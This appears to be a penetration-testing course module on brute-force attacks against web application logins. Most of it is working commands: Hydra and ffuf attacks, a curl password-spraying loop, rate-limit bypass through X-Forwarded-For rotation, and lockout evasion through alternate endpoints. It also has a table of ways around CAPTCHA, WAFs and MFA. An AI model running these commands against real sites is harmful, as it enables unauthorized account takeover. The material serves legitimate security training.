# Brute Force Attacks

## Unit 4: Authentication Testing — Topic 2

## 🎯 Overview

Brute force attacks systematically attempt all possible credentials to gain unauthorized access. Understanding brute force techniques, tools, and defenses is essential for both offensive testing and defensive assessment. This topic covers credential attacks against web applications including dictionary attacks, credential stuffing, and bypass techniques.

---

## 1. Brute Force Attack Types

```
┌──────────────────────────────────────────────────────────────┐
│              BRUTE FORCE CATEGORIES                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Simple Brute Force    │  Try every combination (aaa-zzz)    │
│  Dictionary Attack     │  Use wordlist of common passwords   │
│  Credential Stuffing   │  Use leaked username:password pairs │
│  Password Spraying     │  One password across many usernames │
│  Hybrid Attack         │  Dictionary + rules (Password1!)   │
│  Rule-Based            │  Apply transformations to wordlist  │
│  Reverse Brute Force   │  Known password, unknown username   │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Web Application Brute Force Tools

### Hydra

```bash
# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 16 -f

# HTTP Basic auth
hydra -l admin -P wordlist.txt target.com http-get /admin/ -f

# With proxy (through Burp)
hydra -l admin -P wordlist.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Failed" \
  -s 443 -S -t 10

# Multiple usernames
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"
```

### Burp Suite Intruder

```
┌──────────────────────────────────────────────────────────────┐
│              BURP INTRUDER SETUP                              │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Capture login request in Proxy                           │
│  2. Send to Intruder (Ctrl+I)                               │
│  3. Set payload positions:                                   │
│     username=§admin§&password=§password§                     │
│                                                              │
│  Attack Types:                                               │
│  • Sniper: One position at a time                           │
│  • Battering Ram: Same payload all positions                │
│  • Pitchfork: Parallel lists (user1:pass1, user2:pass2)    │
│  • Cluster Bomb: All combinations (users × passwords)       │
│                                                              │
│  4. Load payloads (password list)                           │
│  5. Check "Grep - Match" for success indicators            │
│  6. Sort results by response length/status to find success  │
└──────────────────────────────────────────────────────────────┘
```

### ffuf for Authentication

```bash
# Brute force login
ffuf -u https://target.com/login \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401 -mc 200,302

# Credential stuffing (pitchfork mode)
ffuf -u https://target.com/login \
  -X POST -d "username=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w users.txt:USER -w passwords.txt:PASS \
  -mode pitchfork -fc 401

# Password spraying
ffuf -u https://target.com/login \
  -X POST -d "username=FUZZ&password=Summer2024!" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w usernames.txt -fc 401
```

---

## 3. Credential Stuffing

```
┌──────────────────────────────────────────────────────────────┐
│              CREDENTIAL STUFFING                              │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Source: Breached databases (publicly leaked)                │
│                                                              │
│  john@email.com:Password123  ──→ Try on target.com          │
│  jane@email.com:MyPass456   ──→ Try on target.com           │
│  bob@email.com:qwerty       ──→ Try on target.com           │
│                                                              │
│  Why it works:                                               │
│  • 65%+ of users reuse passwords across sites               │
│  • Leaked databases contain millions of valid pairs          │
│  • Automated tools make it trivial to test                   │
│                                                              │
│  Sources: haveibeenpwned.com, dehashed, leaked databases     │
└──────────────────────────────────────────────────────────────┘
```

---

## 4. Password Spraying

```bash
# Password spraying strategy:
# Use 1-3 passwords against MANY usernames
# Avoids account lockout (usually 3-5 attempts)

# Common passwords to try:
# Season+Year: Summer2024!, Winter2024!, Spring2024
# Company+123: CompanyName123!, CompanyName2024
# Generic: Password1!, Welcome1!, P@ssw0rd!

# Spray with custom script
while read user; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/login \
    -d "username=$user&password=Summer2024!")
  echo "$user:Summer2024! → $response"
  sleep 2  # Avoid rate limiting
done < users.txt
```

---

## 5. Brute Force Countermeasure Bypass

```
┌──────────────────────────────────────────────────────────────┐
│          BYPASSING BRUTE FORCE PROTECTIONS                    │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Protection          │  Bypass Technique                     │
│  ────────────────────┼─────────────────────────────────────  │
│  Account lockout     │  Password spraying (low & slow)       │
│  CAPTCHA             │  OCR, anti-captcha services, audio    │
│  Rate limiting (IP)  │  IP rotation, X-Forwarded-For         │
│  Rate limiting (acc) │  Spray across accounts                │
│  WAF                 │  Slow requests, header manipulation   │
│  CSRF token          │  Extract token before each request    │
│  JavaScript check    │  Use headless browser (Selenium)      │
│  MFA                 │  Phishing, SIM swap, bypass flaws     │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Bypass rate limiting with IP rotation
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 10.0.0.$((RANDOM % 255))" \
  -d "username=admin&password=test"

# Extract and use CSRF token
TOKEN=$(curl -s https://target.com/login | \
  grep -oP 'csrf_token" value="\K[^"]+')
curl -X POST https://target.com/login \
  -d "username=admin&password=test&csrf_token=$TOKEN"

# Bypass lockout via different login endpoints
curl -X POST https://target.com/api/v1/login  # API endpoint
curl -X POST https://target.com/mobile/login  # Mobile endpoint
curl -X POST https://target.com/api/v2/auth   # Newer API
```

---

## 6. Wordlist Management

```bash
# Generate custom wordlist
# CeWL — create wordlist from website content
cewl https://target.com -d 3 -m 5 -w site-words.txt

# Apply rules to wordlist (John the Ripper)
john --wordlist=site-words.txt --rules --stdout > mutated.txt

# Common mutations:
# password → Password, PASSWORD, p@ssword, P@ssw0rd!
# company → Company1, company123, Company2024!

# Merge and deduplicate
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Top wordlists:
# /usr/share/wordlists/rockyou.txt (14M passwords)
# /usr/share/seclists/Passwords/Common-Credentials/
# /usr/share/seclists/Passwords/Leaked-Databases/
```

---

## 📊 Summary Table

| Attack Type | Usernames | Passwords | Speed | Detection |
|------------|-----------|-----------|-------|-----------|
| Dictionary | Single | Many (wordlist) | Fast | Easy (lockout) |
| Spraying | Many | 1-3 | Slow | Hard |
| Credential Stuffing | Leaked | Leaked | Medium | Medium |
| Simple Brute Force | Single | All combos | Very slow | Easy |
| Hybrid | Single | Rules-based | Medium | Easy |

---

## ❓ Revision Questions

1. What is the difference between credential stuffing and password spraying?
2. How does account lockout protection fail against password spraying?
3. What Burp Intruder attack type is best for testing username:password pairs?
4. How can CAPTCHA protection be bypassed during brute force testing?
5. Why is IP-based rate limiting insufficient against distributed attacks?
6. How do you create an effective custom wordlist for a specific target?

---

*Previous: [01-authentication-mechanisms.md](01-authentication-mechanisms.md) | Next: [03-password-policies.md](03-password-policies.md)*

---

*[Back to README](../README.md)*
